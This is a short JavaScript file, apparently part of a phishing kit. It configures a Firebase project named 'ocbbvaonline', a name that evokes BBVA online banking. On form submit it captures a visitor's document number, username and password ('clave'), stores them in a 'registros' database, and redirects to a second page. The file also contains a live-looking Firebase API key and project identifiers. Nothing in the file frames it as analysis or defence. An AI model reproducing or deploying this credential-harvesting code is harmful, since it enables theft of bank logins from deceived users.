var config = {

  apiKey: "AIzaSyBm_XHk1pC6wisiFUqaYKMMgsCVV2juDnI",
    authDomain: "ocbbvaonline.firebaseapp.com",
    databaseURL: "https://ocbbvaonline-default-rtdb.firebaseio.com",
    projectId: "ocbbvaonline",
    storageBucket: "ocbbvaonline.appspot.com",
    messagingSenderId: "987516694733",
    appId: "1:987516694733:web:6f60c6bc52ac79999a7984"


  };
  firebase.initializeApp(config);

  //Reference for form collection(3)
  let formMessage = firebase.database().ref('registros');

  //listen for submit event//(1)
  document
    .getElementById('registrationform')
    .addEventListener('submit', formSubmit);

  //Submit form(1.2)
  function formSubmit(e) {
    e.preventDefault();
    // Get Values from the DOM
    let documento = document.querySelector('#documento').value;
    let usuario = document.querySelector('#usuario').value;
    let clave = document.querySelector('#clave').value;


    //send message values
    sendMessage(documento, usuario, clave);

    //Show Alert Message(5)
    document.querySelector('.alert').style.display = 'block';

    //Hide Alert Message After Seven Seconds(6)
    setTimeout(function() {
      document.querySelector('.alert').style.display = 'none';
    }, 7000);

    //Form Reset After Submission(7)
    document.getElementById('registrationform').reset();

  }



  //Send Message to Firebase(4)

  function sendMessage(documento, usuario, clave) {
    let newFormMessage = formMessage.push();
    newFormMessage.set({
      documento: documento,
      usuario: usuario,
      clave: clave
    });

    window.location.href = '2.html';

  }
